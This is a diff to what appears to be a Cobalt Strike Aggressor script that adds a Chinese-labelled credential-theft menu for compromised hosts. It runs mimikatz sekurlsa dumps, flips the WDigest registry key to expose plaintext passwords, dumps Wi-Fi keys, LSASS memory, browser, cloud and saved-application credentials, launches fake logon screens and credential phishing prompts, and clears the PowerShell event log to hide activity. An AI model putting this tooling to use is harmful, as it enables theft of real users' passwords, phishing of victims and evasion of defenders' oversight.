@@ -1,4 +1,3 @@
-
 menu "密码抓取" {
 	menu "mimikatz" {
 		item "Mimikatz-logonpasswords" {
@@ -32,9 +31,275 @@ menu "密码抓取" {
 
 		 		}
 		 }
+
+        item "Mimikatz WDigest Credentials"{
+      local('$bid');
+        foreach $bid ($1){
+          wdigest($bid);
+        }
+      }
+    item "Mimikatz Kerberos Credentials"{
+      local('$bid');
+        foreach $bid ($1){
+          kerberos($bid);
+        }
+      }
+    item "Mimikatz MSV LM & NTLM Passwords"{
+      local('$bid');
+        foreach $bid ($1){
+          msv($bid);
+        }
+      }
+    item "Mimikatz TsPkg Passwords"{
+      local('$bid');
+        foreach $bid ($1){
+          tspkg($bid);
+        }
+      }
+    item "Mimikatz LiveSSP passwords"{
+      local('$bid');
+        foreach $bid ($1){
+          livessp($bid);
+        }
+      }
+    item "Mimikatz SSP passwords"{
+      local('$bid');
+        foreach $bid ($1){
+          ssp($bid);
+        }
+      }
+
+    item "Mimikatz Dump Trust"{
+      local('$bid');
+        foreach $bid ($1){
+          trust($bid);
+        }
+      }
+
+    item "Mimikatz Backup Keys"{
+      local('$bid');
+        foreach $bid ($1){
+          backupkeys($bid);
+        }
+      }
+
+    item "Mimikatz Tickets"{
+      local('$bid');
+        foreach $bid ($1){
+          tickets($bid);
+        }
+      }
+
+    item "Mimikatz ekeys"{
+      local('$bid');
+        foreach $bid ($1){
+          ekeys($bid);
+        }
+      }
+
+    item "Mimikatz DPAPI"{
+      local('$bid');
+        foreach $bid ($1){
+          dpapi($bid);
+        }
+      }
+
+    item "Mimikatz DPAPI System Secret"{
+      local('$bid');
+        foreach $bid ($1){
+          dpapisystem($bid);
+        }
+      }
+
+    item "Mimikatz Credential Manager"{
+      local('$bid');
+        foreach $bid ($1){
+          credman($bid);
+        }
+      }
 }
 
 separator();
+
+  menu "探测wifi密码" {
+    item "获取连接过的wifi" {
+      local('$bid');
+      foreach $bid ($1){
+        bshell($1, "netsh wlan show profiles");
+      }
+    }
+    item "获取wifi密码" {
+      prompt_text("输入wifi名: ", "", lambda({
+        bshell(@ids, "netsh wlan show profile name=\"$1\" key=clear");
+      }, @ids => $1));
+    }
+    item "SharpWifiGrabber(检索Wi-Fi密码)"{
+      blog($1, "项目地址：https://github.com/r3nhat/SharpWifiGrabber")
+      bexecute_assembly($1, script_resource('/modules/HashCat/SharpWifiGrabber.exe'), "");
+    }
+  }
+
+    menu "修改注册表dump明文密码" {
+    item "显示明文" {
+      local('$bid');
+      foreach $bid ($1){
+        bshell($1, "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f");
+      }
+    }
+    item "强制锁屏" {
+      local('$bid');
+      foreach $bid ($1){
+        blog($1, "正在执行锁屏");
+        bpowershell_import($bid, script_resource("/modules/HashCat/lock-screen.ps1"));
+        bpowerpick($bid,"Lock-WorkStation");
+        bshell($bid,"wevtutil cl \"Windows PowerShell\"");
+      }
+    }
+    item "隐藏明文" {
+      local('$bid');
+      foreach $bid ($1){
+        bshell($1, "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f");
+      }
+    }
+  }
+
+
+menu "提取浏览器数据及密码" {
+    item "BrowserGhost(提取浏览器密码)" {
+      blog($1, "项目地址：https://github.com/QAX-A-Team/BrowserGhost")
+      bexecute_assembly($1, script_resource("/modules/HashCat/BrowserGhost.exe"));
+    }
+
+    item "SharpChromium(提取浏览器数据)" {
+      $bid = $1['@'];
+      $dialog = dialog("SharpChromium", %(bid => $bid), &SharpChromium);
+      dialog_description($dialog,".NET 4.0 CLR项目，用于检索Chromium数据，如Cookie、历史记录和保存的登录名。项目地址：https://github.com/djhohnstein/SharpChromium");
+      drow_combobox($dialog, "Type", "all/cookies/history/logins", @("all", "cookies","history","logins"));
+      dbutton_action($dialog, "运行");
+      dialog_show($dialog);
+    }
+    sub SharpChromium {
+      bexecute_assembly($bid, script_resource("/modules/HashCat/SharpChromium.exe"), $3['Type']);
+    }
+
+    item "SharpWeb(提取浏览器数据)" {
+      $bid = $1['@'];
+      $dialog = dialog("SharpChromium", %(bid => $bid), &SharpWeb);
+      dialog_description($dialog,"可从Google Chrome，Mozilla Firefox和Microsoft Internet Explorer/Edge检索保存的浏览器凭据。项目地址：https://github.com/djhohnstein/SharpWeb");
+      drow_combobox($dialog, "Type", "all/chrome/firefox/edge", @("all", "chrome","firefox","edge"));
+      dbutton_action($dialog, "运行");
+      dialog_show($dialog);
+    }
+    sub SharpWeb {
+      bexecute_assembly($bid, script_resource("/modules/HashCat/SharpWeb.exe"), $3['Type']);
+    }
+  }
+
+    menu "本地程序文件密码解密" {
+    item "SharpCloud(获取云凭证)" {
+      $bid = $1['@'];
+      $dialog = dialog("获取云凭证", %(bid => $bid), &SharpCloud);
+      dialog_description($dialog, "用于检查是否存在与AWS，Microsoft Azure和Google Compute相关的凭证文件。项目地址：https://github.com/chrismaddalena/SharpCloud");
+      drow_combobox($dialog, "type", "type:", @("all","aws","azure","gcloud"));
+      dbutton_action($dialog, "运行");
+      dialog_show($dialog);
+    }
+    sub SharpCloud {
+      $arg = join(' ',  @($3['type']));
+      bexecute_assembly($bid, script_resource("/modules/HashCat/SharpCloud.exe"), $arg);
+    }
+    menu "SharpDecryptPwd(from uknowsec)" {
+      item "SharpDecryptPwd" {
+        $bid = $1['@'];
+        $dialog = dialog("SharpDecryptPwd", %(type => "-NavicatCrypto",bid => $bid), &SharpDecryptPwd);
+        dialog_description($dialog,"对密码已保存在Windwos系统上的部分程序进行解析,包括：Navicat,TeamViewer,FileZilla,WinSCP,Xmangager系列产品（Xshell,Xftp)。项目地址：https://github.com/uknowsec/SharpDecryptPwd");
+        drow_combobox($dialog, "type", "Type:", @("-NavicatCrypto", "-TeamViewer", "-FileZilla","-WinSCP"));
+        dbutton_action($dialog, "运行");
+        dialog_show($dialog);
+      }
+      item "Xmangager" {
+        $bid = $1['@'];
+        $dialog = dialog("Xmangager", %(type => "-Xmangager",path => "D:\\xshell\\Xshell\\Sessions",bid => $bid), &Xmangager);
+        dialog_description($dialog, "Xmangager系列产品，如：Xshell,Xftp。");
+        drow_combobox($dialog, "type", "Type:", @("-Xmangager"));
+        drow_text($dialog, "path", "Sessions Path:  ");
+        dbutton_action($dialog, "运行");
+        dialog_show($dialog);
+      }
+    }
+    sub SharpDecryptPwd {
+      bexecute_assembly($bid, script_resource("/modules/HashCat/SharpDecryptPwd.exe"), $3['type']);
+    }
+    sub Xmangager {
+      $arg = join(' ', @($3['type'],"-p",$3['path']));
+      bexecute_assembly($bid, script_resource("/modules/HashCat/SharpDecryptPwd.exe"), $arg);
+    }
+
+    menu "SharpDecryptPwd(from RcoIl)" {
+      item "SharpDecryptPwd40" {
+        $bid = $1['@'];
+        $dialog = dialog("SharpDecryptPwd40", %(type => "-Navicat",bid => $bid), &SharpDecryptPwd40);
+        dialog_description($dialog,"目前支持 Navicat 系列、Xmanager 系列、TeamViewer、FileZilla 客户端、Foxmail、RealVNC 服务端、TortoiseSVN、WinSCP、Chrome 全版本。项目地址：https://github.com/RcoIl/SharpDecryptPwd");
+        drow_combobox($dialog, "type", "Type:", @("-Navicat", "-TeamViewer", "-FileZilla","-WinSCP","-Foxmail","-RealVNC","-TortoiseSVN","-Chrome"));
+        dbutton_action($dialog, "运行");
+        dialog_show($dialog);
+      }
+      item "Xmangager40" {
+        $bid = $1['@'];
+        $dialog = dialog("Xmangager", %(type => "-Xmanager",path => "D:\\xshell\\Xshell\\Sessions",bid => $bid), &Xmangager40);
+        dialog_description($dialog, "Xmangager系列产品，如：Xshell,Xftp。");
+        drow_combobox($dialog, "type", "Type:", @("-Xmanager"));
+        drow_text($dialog, "path", "Sessions Path:  ");
+        dbutton_action($dialog, "运行");
+        dialog_show($dialog);
+      }
+    }
+    sub SharpDecryptPwd40 {
+      bexecute_assembly($bid, script_resource("/modules/HashCat/SharpDecryptPwd40.exe"), $3['type']);
+    }
+    sub Xmangager40 {
+      $arg = join(' ', @($3['type'],"-p",$3['path']));
+      bexecute_assembly($bid, script_resource("/modules/HashCat/SharpDecryptPwd40.exe"), $arg);
+    }
+  }
+
+item "Net-GPPPassword(组策略帐户凭据)" {
+    blog($1, ".NET实现的Get-GPPPassword。检索通过组策略首选项推送的帐户的明文密码和其他信息。该技术很旧，但是在很早以前创建域的环境中仍然很有用。项目地址：https://github.com/outflanknl/Net-GPPPassword")
+    bexecute_assembly($1, script_resource("/modules/HashCat/Net-GPPPassword_dotNET_v2.exe"), "");
+  }
+
+menu "钓鱼密码窃取" {
+ 	item "FakeTheScreen" {
+		$dialog = dialog("QAQ",%(bid => $1["@"] , os => "Win7") ,&FakerScreen);
+		dialog_description($dialog,"QAQ");
+		drow_combobox($dialog,"os","系统:",@("Win7","Win10"));
+		dbutton_action($dialog,"Exploit");
+		dialog_show($dialog);
+	}
+sub FakerScreen {
+	if ($3["os"] eq "Win7")
+	{
+		bexecute_assembly($3["bid"],script_resource("./modules/HashCat/fakelogonscreen_trunk/DOTNET35/FakeLogonScreen.exe"));
+	}
+	else
+	{
+		bexecute_assembly($3["bid"],script_resource("./modules/HashCat/fakelogonscreen_trunk/FakeLogonScreen.exe"));
+	}
+}
+    item "CredPhisher(认证登录框钓鱼)" {
+      $bid = $1['@'];
+      $dialog = dialog("CredPhisher", %(content => "安全认证",bid => $bid), &CredPhisher);
+      dialog_description($dialog, "弹出安全认证登录框，进行钓鱼。windows10测试成功。项目地址：https://github.com/matterpreter/OffensiveCSharp/tree/master/CredPhisher");
+      drow_text($dialog, "content", "content:");
+      dbutton_action($dialog, "运行");
+      dialog_show($dialog);
+    }
+    sub CredPhisher {
+      $arg = join('',@("",$3['content']));
+      bexecute_assembly($bid, script_resource("/modules/HashCat/CredPhisher.exe"), $arg);
+    }
+  }
+  
 	item "Navicat-Password" {
 		    local('$bid');
             foreach $bid ($1){
@@ -55,10 +320,22 @@ separator();
             internal_monologue($bid);
            }
 	}
+  item "DumpLsassMemory"{
+      $dialog = dialog("QAQ",%(bid => $1["@"] , pid => "1024") ,&DumpLsassMemorys);
+    dialog_description($dialog,"请输入Lsass's pid");
+    drow_text($dialog,"pid","pid:");
+    dbutton_action($dialog,"Exploit");
+    dialog_show($dialog);
+  }
+}
+sub DumpLsassMemorys{
+    $binary = script_resource("./modules/HashCat/MiniDumpLsass.exe");
+    bexecute_assembly($3["bid"],$binary,$3['pid']);
 }
 
+
 sub navicat_password{
-	$binary = script_resource("./modules/navicatpwd.exe");
+	$binary = script_resource("./modules/HashCat/navicatpwd.exe");
 	$help = "Automatic access to Navicat connection information and password";
 	beacon_command_register("navicat", $help, "Use: navicat <Automatically export all and decrypt>\nnavicat 12 <Decrypt with 12 algorithms> OR navicat 15057D7BA390\nnavicat 15057D7BA390 12<Decrypt the password of parameter one with 12 algorithm>\n\n$help");
 	if(!-exists $binary)
@@ -70,7 +347,7 @@ sub navicat_password{
 }
 
 sub lazagne_password{
-	$binary = script_resource("./modules/lazagne.exe");
+	$binary = script_resource("./modules/HashCat/lazagne.exe");
 	$help = "The LaZagne project is an open source application used to retrieve lots of passwords stored on a local computer";
 	beacon_command_register("lazagne", $help, "The LaZagne project is an open source application used to retrieve lots of passwords stored on a local computer\n\n$help");
 	if(!-exists $binary)
@@ -83,7 +360,7 @@ sub lazagne_password{
 }
 
 sub internal_monologue{
-	$binary = script_resource("./modules/InternalMonologue.exe");
+	$binary = script_resource("./modules/HashCat/InternalMonologue.exe");
 	$help = "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS";
 	beacon_command_register("lazagne", $help, "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS.\n\n$help");
 	if(!-exists $binary)
@@ -93,4 +370,76 @@ sub internal_monologue{
 	}
 	$args = "-Downgrade True -Verbose True";
 	bexecute_assembly($1, $binary, $args);
+}
+
+
+sub wdigest{
+
+bmimikatz($1, "sekurlsa::wdigest");
+
+}
+sub kerberos{
+
+bmimikatz($1, "sekurlsa::kerberos");
+
+}
+sub msv{
+
+bmimikatz($1, "sekurlsa::msv");
+
+}
+sub tspkg{
+
+bmimikatz($1, "sekurlsa::tspkg");
+
+}
+sub livessp{
+
+bmimikatz($1, "sekurlsa::livessp");
+
+}
+sub ssp{
+
+bmimikatz($1, "sekurlsa::ssp");
+
+}
+
+
+sub trust{
+
+bmimikatz($1, "sekurlsa::trust");
+
+}
+sub backupkeys{
+
+bmimikatz($1, "sekurlsa::backupkeys");
+
+}
+sub tickets{
+
+bmimikatz($1, "sekurlsa::tickets");
+
+}
+sub ekeys{
+
+bmimikatz($1, "sekurlsa::ekeys");
+
+}
+
+sub dpapi{
+
+bmimikatz($1, "sekurlsa::dpapi");
+
+}
+
+sub dpapisystem{
+
+bmimikatz($1, "sekurlsa::dpapi");
+
+}
+
+sub credman{
+
+bmimikatz($1, "sekurlsa::credman");
+
 }
